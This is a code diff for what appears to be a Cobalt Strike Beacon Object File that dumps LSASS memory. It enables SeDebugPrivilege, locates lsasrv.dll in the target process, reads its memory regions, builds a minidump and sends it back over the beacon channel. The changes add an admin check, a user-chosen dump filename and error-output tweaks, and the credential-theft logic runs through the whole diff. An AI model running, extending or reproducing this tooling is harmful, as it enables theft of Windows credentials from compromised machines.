@@ -173,7 +173,7 @@ PVOID GetDllBaseAddress(HANDLE hProcess, const wchar_t* dllName) {
     
     status =  NTDLL$NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
     if (!NT_SUCCESS(status)) {
-         BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to query process information. NTSTATUS: 0x%x\n", status);
+         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to query process information. NTSTATUS: 0x%x\n", status);
         return NULL;
     }
 
@@ -182,7 +182,7 @@ PVOID GetDllBaseAddress(HANDLE hProcess, const wchar_t* dllName) {
     status = NTDLL$NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead);
     if (!NT_SUCCESS(status))
     {
-         BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to read PEB from remote process\n");
+         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read PEB from remote process\n");
         return NULL;
     }
 
@@ -191,7 +191,7 @@ PVOID GetDllBaseAddress(HANDLE hProcess, const wchar_t* dllName) {
     status = NTDLL$NtReadVirtualMemory(hProcess, peb.Ldr, &ldr, sizeof(ldr), &bytesRead);
     if (!NT_SUCCESS(status))
     {
-         BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to read PEB_LDR_DATA from remote process\n");
+         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read PEB_LDR_DATA from remote process\n");
         return NULL;
     }
 
@@ -205,8 +205,8 @@ PVOID GetDllBaseAddress(HANDLE hProcess, const wchar_t* dllName) {
         status = NTDLL$NtReadVirtualMemory(hProcess, pListEntry, &currentEntry, sizeof(LIST_ENTRY), &bytesRead);
         if (!NT_SUCCESS(status))
         {
-             BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to read LIST_ENTRY from remote process at 0x%p\n", pListEntry);
-             BeaconPrintf(CALLBACK_OUTPUT, "[-] Error Code: %d\n", KERNEL32$GetLastError());
+             BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read LIST_ENTRY from remote process at 0x%p\n", pListEntry);
+             BeaconPrintf(CALLBACK_ERROR, "[-] Error Code: 0x%08x\n", KERNEL32$GetLastError());
             return NULL;
         }
 
@@ -215,8 +215,8 @@ PVOID GetDllBaseAddress(HANDLE hProcess, const wchar_t* dllName) {
         status = NTDLL$NtReadVirtualMemory(hProcess, (PBYTE)pListEntry - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &ldrEntry, sizeof(ldrEntry), &bytesRead);
         if (!NT_SUCCESS(status))
          {
-             BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to read LDR_DATA_TABLE_ENTRY from remote process\n");
-             BeaconPrintf(CALLBACK_OUTPUT, "[-] Error Code: %d\n", KERNEL32$GetLastError());
+             BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read LDR_DATA_TABLE_ENTRY from remote process\n");
+             BeaconPrintf(CALLBACK_ERROR, "[-] Error Code: 0x%08x\n", KERNEL32$GetLastError());
             return NULL;
         }
 
@@ -233,8 +233,8 @@ PVOID GetDllBaseAddress(HANDLE hProcess, const wchar_t* dllName) {
         status =  NTDLL$NtReadVirtualMemory(hProcess, ldrEntry.BaseDllName.Buffer, dllBaseName, maxReadSize, &bytesRead); 
         if (!NT_SUCCESS(status))
         {
-             BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to read DLL name from remote process\n");
-             BeaconPrintf(CALLBACK_OUTPUT, "[-] Error Code: %d\n", KERNEL32$GetLastError());
+             BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read DLL name from remote process\n");
+             BeaconPrintf(CALLBACK_ERROR, "[-] Error Code: 0x%08x\n", KERNEL32$GetLastError());
             return NULL;
         }
 
@@ -249,7 +249,7 @@ PVOID GetDllBaseAddress(HANDLE hProcess, const wchar_t* dllName) {
 
     } while (pListEntry != pListHead);
 
-     BeaconPrintf(CALLBACK_OUTPUT, "[-] DLL not found in remote process\n");
+    BeaconPrintf(CALLBACK_ERROR, "[-] DLL not found in remote process\n");
     return NULL;
 }
 
@@ -262,14 +262,14 @@ BOOL EnableDebugPriv() {
 
     if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
     {
-         BeaconPrintf(CALLBACK_OUTPUT, "[-] OpenProcessToken failed: %d\n", KERNEL32$GetLastError());
+         BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken failed: 0x%08x\n", KERNEL32$GetLastError());
         return FALSE;
     }
 
 
     if (!ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &TokenPrivileges.Privileges[0].Luid))
     {
-         BeaconPrintf(CALLBACK_OUTPUT, "[-] LookupPrivilegeValue failed: %d\n", KERNEL32$GetLastError());
+         BeaconPrintf(CALLBACK_ERROR, "[-] LookupPrivilegeValue failed: 0x%08x\n", KERNEL32$GetLastError());
         return FALSE;
     }
 
@@ -279,7 +279,7 @@ BOOL EnableDebugPriv() {
     
     if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
     {
-         BeaconPrintf(CALLBACK_OUTPUT, "[-] AdjustTokenPrivileges failed: %d\n", KERNEL32$GetLastError());
+         BeaconPrintf(CALLBACK_ERROR, "[-] AdjustTokenPrivileges failed: 0x%08x\n", KERNEL32$GetLastError());
         return FALSE;
     }
 
@@ -293,20 +293,37 @@ void go(char* arg, int len) {
     NTSTATUS status;
 
     long long max_mem = 0x7FFFFFFEFFFF;
-    VOID* mem_address = NULL;
+    void* mem_address = NULL;
 
     BYTE* memory_regions = NULL;
     SIZE_T memory_regions_size = 0;
     MEMORY_64_INFO* mem64info_list = NULL;
     SIZE_T mem64infolist_count = 0;
-    LPVOID lsasrvdll_address = NULL;
+    void* lsasrvdll_address = NULL;
 
 
+    if (len != 1)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Need to specify name of the minidump file\n");
+        return;
+    }
 
 
+    if(!BeaconIsAdmin())
+    {
+        BeaconPrintf(CALLBACK_ERROR, "This needs to be run in high integrity context\n");
+        return;
+    }
+
+    //Get Beacon Args
+
+    datap data;
+    BeaconDataParse(&data, arg, len);
+    char* filename;
+    filename = BeaconDataExtract(&data, NULL);
 
     if (!EnableDebugPriv()) {
-         BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not enable SE_DEBUG_PRIVILEGE. Error: %d\n", KERNEL32$GetLastError());
+         BeaconPrintf(CALLBACK_ERROR, "[*] Could not enable SE_DEBUG_PRIVILEGE. Error: 0x%08x\n", KERNEL32$GetLastError());
         return;
     }
 
@@ -319,15 +336,15 @@ void go(char* arg, int len) {
   
     status = NTDLL$NtOpenProcess(&hProc, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objectAttributes, &clientId);
     if (!NT_SUCCESS(status)) {
-         BeaconPrintf(CALLBACK_OUTPUT, "[-] Error in NtOpenProcess\n");
-         BeaconPrintf(CALLBACK_OUTPUT, "NTSTATUS: 0x%08x\n", status);
+         BeaconPrintf(CALLBACK_ERROR, "[-] Error in NtOpenProcess\n");
+         BeaconPrintf(CALLBACK_ERROR, "NTSTATUS: 0x%08x\n", status);
         NTDLL$NtClose(hProc);
         return;
     }
 
     lsasrvdll_address = GetDllBaseAddress(hProc, L"lsasrv.dll");
     if (lsasrvdll_address == NULL) {
-         BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not get address of lsasrv.dll. Error: 0x%08x\n", KERNEL32$GetLastError());
+         BeaconPrintf(CALLBACK_ERROR, "[*] Could not get address of lsasrv.dll. Error: 0x%08x\n", KERNEL32$GetLastError());
         return;
     }
 
@@ -341,7 +358,7 @@ void go(char* arg, int len) {
         status = NTDLL$NtQueryVirtualMemory(hProc, mem_address, MemoryBasicInformation, &mbi, sizeof(mbi), &returnLength);
         
         if (status != 0) {
-             BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x%08X\n", status);
+             BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x%08X\n", status);
             continue;
         }
 
@@ -351,7 +368,7 @@ void go(char* arg, int len) {
 
             mem64info_list = (MEMORY_64_INFO*)MSVCRT$realloc(mem64info_list, (mem64infolist_count + 1) * sizeof(MEMORY_64_INFO));
             if (mem64info_list == NULL) {
-                 BeaconPrintf(CALLBACK_OUTPUT, "[-] Could not reallocate memory for mem64info_list. Error: %d\n", KERNEL32$GetLastError());
+                 BeaconPrintf(CALLBACK_ERROR, "[-] Could not reallocate memory for mem64info_list. Error: 0x%08x\n", KERNEL32$GetLastError());
                 return;
             }
 
@@ -362,19 +379,19 @@ void go(char* arg, int len) {
             
             BYTE* buffer = (BYTE*)MSVCRT$malloc(mbi.RegionSize);
             if (buffer == NULL) {
-                 BeaconPrintf(CALLBACK_OUTPUT, "[-] Could not allocate memory for buffer. Error: %d\n", KERNEL32$GetLastError());
+                 BeaconPrintf(CALLBACK_ERROR, "[-] Could not allocate memory for buffer. Error: 0x%08x\n", KERNEL32$GetLastError());
                 return;
             }
 
             ULONG bytesRead = 0;
             status = NTDLL$NtReadVirtualMemory(hProc, mbi.BaseAddress, buffer, mbi.RegionSize, &bytesRead);
             if (status != 0 && status != STATUS_PARTIAL_COPY) {
-                 BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x%08X\n", status);
+                 BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x%08X\n", status);
             }
 
             memory_regions = (BYTE*)MSVCRT$realloc(memory_regions, memory_regions_size + mbi.RegionSize);
             if (memory_regions == NULL) {
-                 BeaconPrintf(CALLBACK_OUTPUT, "[-] Could not reallocate memory for memory_regions. Error: %d\n", KERNEL32$GetLastError());
+                 BeaconPrintf(CALLBACK_ERROR, "[-] Could not reallocate memory for memory_regions. Error: 0x%08x\n", KERNEL32$GetLastError());
                 return;
             }
 
@@ -456,7 +473,7 @@ void go(char* arg, int len) {
     dllStruct.Length = MSVCRT$wcslen(dllPath) * 2;
     dllStruct.Buffer = (wchar_t*)MSVCRT$malloc(dllStruct.Length);
     if (dllStruct.Buffer == NULL) {
-     BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to allocate memory for dllStruct.Buffer\n");
+     BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for dllStruct.Buffer\n");
     return;
     }
 
@@ -530,9 +547,8 @@ void go(char* arg, int len) {
         }
     MSVCRT$memcpy(currentPointer, memory_regions, memory_regions_size);
 
-     char dmpFile[] = "minidump.dmp";
 
-    downloadFile(dmpFile, MSVCRT$strlen(dmpFile), dmpFileBuffer, totalSize);
+    downloadFile(filename, MSVCRT$strlen(filename), dmpFileBuffer, totalSize);
 
     //Cleanup
     MSVCRT$free(dmpFileBuffer);
